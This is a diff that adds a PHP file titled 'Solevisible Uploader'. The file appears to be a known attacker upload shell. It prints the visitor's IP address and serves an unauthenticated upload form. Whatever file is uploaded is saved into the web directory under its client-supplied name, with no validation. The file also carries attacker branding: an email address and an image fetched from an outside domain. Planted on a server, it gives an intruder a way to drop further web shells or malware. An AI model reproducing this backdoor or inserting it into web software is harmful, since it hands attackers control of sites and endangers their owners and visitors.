@@ -1,0 +1,18 @@
+<?php
+echo "<title>Solevisible Uploader</title>\n<body bgcolor=#000000>\n<br>\n<center><font color=\"white\"><b>Your Ip Address is</b> <font color=\"white\"></font></center>\n<big><font color=\"#7CFC00\"><center>\n";
+echo $_SERVER["REMOTE_ADDR"];
+echo "</center></font></a><font color=\"#7CFC00\">\n<br>\n<br>\n<center><font color=\"#7CFC00\"><big>Solevisible Upload Area</big></font></a><font color=\"#7CFC00\"></font></center><br>\n<center><form method='post' enctype='multipart/form-data' name='uploader'>";
+echo '<input type="file" name="file" size="45"><input name="_upl" type="submit" id="_upl" value="Upload"></form></center>';
+if (isset($_POST["_upl"]) && $_POST["_upl"] == "Upload") {
+    if (
+        @move_uploaded_file(
+            $_FILES["file"]["tmp_name"],
+            $_FILES["file"]["name"]
+        )
+    ) {
+        echo '<b><font color="#7CFC00"><center>Upload Successfully ;)</font></a><font color="#7CFC00"></b><br><br>';
+    } else {
+        echo '<b><font color="#7CFC00"><center>Upload failed :(</font></a><font color="#7CFC00"></b><br><br>';
+    }
+}
+echo '<center><span style="font-size:30px; background: url(&quot;http://solevisible.com/images/bg_effect_up.gif&quot;) repeat-x scroll 0% 0% transparent; color: red; text-shadow: 8px 8px 13px;"><strong><b><big>solevisible@gmail.com</b></big></strong></span></center>';?>
